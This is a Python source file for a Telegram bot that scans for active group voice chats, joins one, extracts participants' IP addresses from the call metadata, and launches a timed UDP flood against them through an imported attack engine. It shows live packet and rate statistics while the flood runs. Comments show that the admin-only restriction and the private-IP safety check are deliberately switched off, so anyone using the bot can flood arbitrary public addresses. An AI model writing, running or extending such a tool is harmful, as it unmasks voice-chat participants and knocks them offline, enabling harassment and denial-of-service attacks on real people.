"""Enhanced Telegram bot controller with auto-attack workflow."""

from __future__ import annotations

import asyncio
import logging
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional

from pyrogram import Client, filters
from pyrogram.errors import FloodWait
from pyrogram.handlers import CallbackQueryHandler, MessageHandler
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup

from attack_engine import AttackEngine
from utils import human_bytes, is_valid_port
from vc_detector import VCDetector, VCRecord

LOGGER = logging.getLogger(__name__)


class BotState(str, Enum):
    IDLE = "IDLE"
    SCANNING = "SCANNING"
    SELECTION = "SELECTION"
    JOINING = "JOINING"
    MANUAL_JOIN_WAIT = "MANUAL_JOIN_WAIT"
    READY = "READY"
    CONFIRM_ATTACK = "CONFIRM_ATTACK"
    ATTACKING = "ATTACKING"


@dataclass
class SessionContext:
    state: BotState = BotState.IDLE
    active_records: list = field(default_factory=list)
    selected_record: Optional[VCRecord] = None
    extracted_metadata: Optional[dict] = None
    target_ip: Optional[str] = None
    target_port: int = 0
    progress_task: Optional[asyncio.Task] = None
    pending_attack: bool = False
    manual_join_requested: bool = False


class BotHandler:
    def __init__(
        self,
        bot: Client,
        detector: VCDetector,
        engine: AttackEngine,
        admin_id: Optional[int],
        max_duration: int,
        scan_limit: int,
    ) -> None:
        self.bot = bot
        self.detector = detector
        self.engine = engine
        self.admin_id = admin_id
        self.max_duration = max_duration
        self.scan_limit = scan_limit
        self.ctx = SessionContext()

        # Register handlers without ADMIN_ID restrictions for local testing.
        self.bot.add_handler(MessageHandler(self.on_scan, filters.command("scan")))
        self.bot.add_handler(MessageHandler(self.on_stop, filters.command("stop")))
        self.bot.add_handler(MessageHandler(self.on_attack_ip, filters.command("attack")))
        self.bot.add_handler(MessageHandler(self.on_status, filters.command("status")))
        self.bot.add_handler(CallbackQueryHandler(self.on_callback))

    async def on_scan(self, client: Client, message):
        """Scan for active voice chats."""
        if self.ctx.state != BotState.IDLE:
            await message.reply(f"⚠️ Currently in state: {self.ctx.state.value}. Use /stop to reset.")
            return

        self.ctx.state = BotState.SCANNING
        status = await message.reply("🔎 Scanning for active voice chats...")
        
        try:
            records = await self.detector.scan_active_voice_chats(limit=self.scan_limit)
        except FloodWait as wait_err:
            await status.edit_text(f"⚠️ FloodWait: retry after {wait_err.value} seconds.")
            self.ctx.state = BotState.IDLE
            return
        except Exception as exc:
            LOGGER.exception("Scan failed")
            await status.edit_text(f"❌ Scan failed: {exc}")
            self.ctx.state = BotState.IDLE
            return

        self.ctx.active_records = records
        
        if not records:
            await status.edit_text("❌ No active voice chat found.\n\nStart a VC in your group first, then run /scan")
            self.ctx.state = BotState.IDLE
            return

        # Create selection buttons
        buttons = []
        for idx, item in enumerate(records):
            btn_text = f"{idx + 1}. {item.title[:35]}" if len(item.title) <= 35 else f"{idx + 1}. {item.title[:32]}..."
            buttons.append([InlineKeyboardButton(btn_text, callback_data=f"select:{idx}")])

        await status.edit_text(
            f"✅ Found {len(records)} active voice chat(s):\n\nSelect a target:",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        self.ctx.state = BotState.SELECTION

    async def on_stop(self, client: Client, message):
        """Stop all operations."""
        self.engine.stop()
        if self.ctx.progress_task:
            self.ctx.progress_task.cancel()
            self.ctx.progress_task = None
        
        # Leave VC if joined
        if self.ctx.selected_record:
            try:
                await self.detector.leave_call(self.ctx.selected_record)
            except:
                pass

        self.ctx = SessionContext()  # Reset context
        await message.reply("🛑 All operations stopped. State reset to IDLE.")

    async def on_status(self, client: Client, message):
        """Show current status."""
        status_text = f"""
📊 Current Status:
• State: {self.ctx.state.value}
• Selected VC: {self.ctx.selected_record.title if self.ctx.selected_record else 'None'}
• Target IP: {self.ctx.target_ip or 'Not set'}
• Target Port: {self.ctx.target_port or 'Not set'}
• Attack Pending: {'Yes' if self.ctx.pending_attack else 'No'}
"""
        await message.reply(status_text)

    async def on_attack_ip(self, client: Client, message):
        """Manual attack command on specific IP."""
        args = message.text.split()
        if len(args) < 3:
            await message.reply("Usage: /attack <ip> <port> [duration_seconds]\nExample: /attack 192.168.1.1 8080 30")
            return

        ip = args[1]
        port = int(args[2])
        duration = int(args[3]) if len(args) > 3 else 30
        duration = min(duration, self.max_duration)

        if not is_valid_port(port):
            await message.reply("❌ Invalid port. Must be 1-65535.")
            return

        # For authorized testing, we can bypass private IP check
        # In production, uncomment: if not is_private_or_loopback(ip): ...

        await self._start_attack(message.chat.id, ip, port, duration)

    async def on_callback(self, client: Client, callback_query):
        """Handle callback queries."""
        data = callback_query.data or ""
        
        # Handle VC selection
        if data.startswith("select:"):
            await self._handle_vc_selection(callback_query, data)
            return

        # Handle join confirmation
        if data == "join:yes":
            await self._handle_join_yes(callback_query)
            return

        if data == "manual_join:confirm":
            await self._handle_manual_join_confirm(callback_query)
            return

        if data == "manual_join:cancel":
            self.ctx.state = BotState.IDLE
            self.ctx.manual_join_requested = False
            await callback_query.message.edit_text("❌ Cancelled manual join flow.")
            await callback_query.answer()
            return
        
        if data == "join:no":
            self.ctx.state = BotState.IDLE
            await callback_query.message.edit_text("❌ Cancelled.")
            await callback_query.answer()
            return

        # Handle attack confirmation
        if data == "attack:confirm":
            await self._handle_attack_confirm(callback_query)
            return
        
        if data == "attack:cancel":
            self.ctx.pending_attack = False
            self.ctx.state = BotState.READY
            await callback_query.message.edit_text("❌ Attack cancelled.")
            await callback_query.answer()
            return

        # Handle leave
        if data == "leave":
            await self._handle_leave(callback_query)
            return

        if data == "manual_attack":
            await callback_query.answer("Use /attack <ip> <port> [duration]")
            return

        # Handle global stop
        if data == "global_stop":
            self.engine.stop()
            self.ctx.pending_attack = False
            self.ctx.state = BotState.READY
            await callback_query.answer("🛑 Attack stopped!")
            return

    async def _handle_vc_selection(self, callback_query, data):
        """Handle VC selection."""
        try:
            index = int(data.split(":", 1)[1])
            self.ctx.selected_record = self.ctx.active_records[index]
            
            await callback_query.message.edit_text(
                f"🎯 Selected: {self.ctx.selected_record.title}\n\n"
                f"Join this VC and extract connection info?",
                reply_markup=InlineKeyboardMarkup([
                    [
                        InlineKeyboardButton("✅ PROCEED", callback_data="join:yes"),
                        InlineKeyboardButton("❌ CANCEL", callback_data="join:no")
                    ]
                ])
            )
            await callback_query.answer()
        except Exception as exc:
            LOGGER.exception("Selection error")
            await callback_query.answer(f"Error: {exc}", show_alert=True)

    async def _handle_join_yes(self, callback_query):
        """Handle join confirmation."""
        if not self.ctx.selected_record:
            await callback_query.answer("No VC selected!", show_alert=True)
            return

        self.ctx.state = BotState.JOINING
        await callback_query.message.edit_text("⏳ Joining VC and extracting metadata...")
        await callback_query.answer()

        try:
            metadata = await self.detector.join_and_extract_metadata(self.ctx.selected_record)
            self.ctx.extracted_metadata = metadata

            # If bot cannot join directly, ask for manual join + confirm.
            if not metadata.get("joined"):
                self.ctx.state = BotState.MANUAL_JOIN_WAIT
                self.ctx.manual_join_requested = True
                notice = metadata.get("notice") or "Auto join failed."
                await callback_query.message.edit_text(
                    f"⚠️ {notice}\n\n"
                    f"Please join the VC manually from client account, then tap confirm.\n"
                    f"After confirmation, IP extraction and attack flow will continue.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("✅ Manual Join Ho Gaya", callback_data="manual_join:confirm")],
                        [InlineKeyboardButton("❌ Cancel", callback_data="manual_join:cancel")],
                    ]),
                )
                return

            await self._process_extracted_metadata(callback_query, metadata)

        except Exception as exc:
            LOGGER.exception("Join/Extract failed")
            self.ctx.state = BotState.IDLE
            await callback_query.message.edit_text(f"❌ Join/Extract failed: {exc}")

    async def _handle_manual_join_confirm(self, callback_query):
        """Re-check metadata after manual join confirmation."""
        if not self.ctx.selected_record:
            await callback_query.answer("No VC selected!", show_alert=True)
            return

        self.ctx.state = BotState.JOINING
        await callback_query.message.edit_text("⏳ Verifying manual join and extracting IP metadata...")
        await callback_query.answer()

        try:
            metadata = await self.detector.join_and_extract_metadata(self.ctx.selected_record)
            self.ctx.extracted_metadata = metadata
            self.ctx.manual_join_requested = False
            await self._process_extracted_metadata(callback_query, metadata)
        except Exception as exc:
            LOGGER.exception("Manual join confirmation failed")
            self.ctx.state = BotState.IDLE
            self.ctx.manual_join_requested = False
            await callback_query.message.edit_text(f"❌ Metadata extraction failed after manual join: {exc}")

    async def _process_extracted_metadata(self, callback_query, metadata: dict):
        """Normalize extracted metadata and show attack actions."""
        extracted_ips = metadata.get("extracted_ips", [])

        if not extracted_ips:
            self.ctx.state = BotState.READY
            await callback_query.message.edit_text(
                "⚠️ VC access confirmed but no IP addresses extracted.\n\n"
                "Use /attack <ip> <port> to continue manually."
            )
            return

        ip_list_text = "\n".join([
            f"• {ip['ip']}:{ip['port']} ({ip['type']})"
            for ip in extracted_ips[:5]
        ])

        join_status = "✅ VC joined" if metadata.get("joined") else "✅ Manual join confirmed"
        await callback_query.message.edit_text(
            f"{join_status}\n\n"
            f"🎯 Extracted IPs:\n{ip_list_text}\n\n"
            f"Select an action:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🚀 AUTO ATTACK (First IP)", callback_data="attack:confirm")],
                [InlineKeyboardButton("📝 Manual /attack", callback_data="manual_attack")],
                [InlineKeyboardButton("🚪 Leave VC", callback_data="leave")]
            ])
        )

        self.ctx.state = BotState.CONFIRM_ATTACK
        self.ctx.pending_attack = True

        first_ip = extracted_ips[0]
        self.ctx.target_ip = first_ip['ip']
        self.ctx.target_port = first_ip['port'] if first_ip['port'] > 0 else 10001

    async def _handle_attack_confirm(self, callback_query):
        """Handle attack confirmation."""
        if not self.ctx.pending_attack or not self.ctx.target_ip:
            await callback_query.answer("No attack pending!", show_alert=True)
            return

        await callback_query.answer("🚀 Starting attack...")
        
        # Start attack
        await self._start_attack(
            callback_query.message.chat.id,
            self.ctx.target_ip,
            self.ctx.target_port,
            60  # Default 60 seconds
        )

    async def _start_attack(self, chat_id: int, ip: str, port: int, duration: int):
        """Start attack on specified target."""
        self.ctx.state = BotState.ATTACKING
        
        dashboard = await self.bot.send_message(
            chat_id,
            f"🚀 Starting attack on {ip}:{port} for {duration}s..."
        )
        
        self.ctx.progress_task = asyncio.create_task(
            self._progress_loop(dashboard.chat.id, dashboard.id)
        )

        try:
            stats = await self.engine.run_udp_test(ip=ip, port=port, duration=duration)
            
            await dashboard.edit_text(
                f"✅ Attack completed on {ip}:{port}\n\n"
                f"📊 Statistics:\n"
                f"• Packets Sent: {stats.sent_packets}\n"
                f"• Failed: {stats.failed_packets}\n"
                f"• Data: {human_bytes(stats.bytes_sent)}\n"
                f"• RPS: {stats.rps:.2f}\n"
                f"• Duration: {stats.elapsed:.1f}s"
            )
            
        except Exception as exc:
            LOGGER.exception("Attack failed")
            await dashboard.edit_text(f"❌ Attack failed: {exc}")
        
        finally:
            if self.ctx.progress_task:
                self.ctx.progress_task.cancel()
                self.ctx.progress_task = None
            
            self.ctx.state = BotState.READY
            self.ctx.pending_attack = False

    async def _handle_leave(self, callback_query):
        """Handle leave VC."""
        if self.ctx.selected_record:
            try:
                await self.detector.leave_call(self.ctx.selected_record)
                await callback_query.answer("Left VC")
            except Exception as exc:
                await callback_query.answer(f"Leave error: {exc}")
        
        self.ctx.state = BotState.IDLE
        self.ctx.pending_attack = False
        await callback_query.message.edit_text("👋 Left VC. Use /scan to start again.")

    async def _progress_loop(self, chat_id: int, message_id: int):
        """Update attack progress."""
        while True:
            await asyncio.sleep(5)
            stats = self.engine.stats
            
            if not stats.running:
                break

            try:
                await self.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=(
                        f"🚀 ATTACK IN PROGRESS\n\n"
                        f"🎯 Target: {self.ctx.target_ip}:{self.ctx.target_port}\n"
                        f"📤 Data Sent: {human_bytes(stats.bytes_sent)}\n"
                        f"📦 Packets: {stats.sent_packets} sent / {stats.failed_packets} failed\n"
                        f"⚡ RPS: {stats.rps:.2f}\n"
                        f"⏱️ Elapsed: {stats.elapsed:.1f}s"
                    ),
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="global_stop")]
                    ])
                )
            except Exception:
                pass  # Ignore edit errors

    def register_handlers(self):
        """Additional handler registration if needed."""
        pass
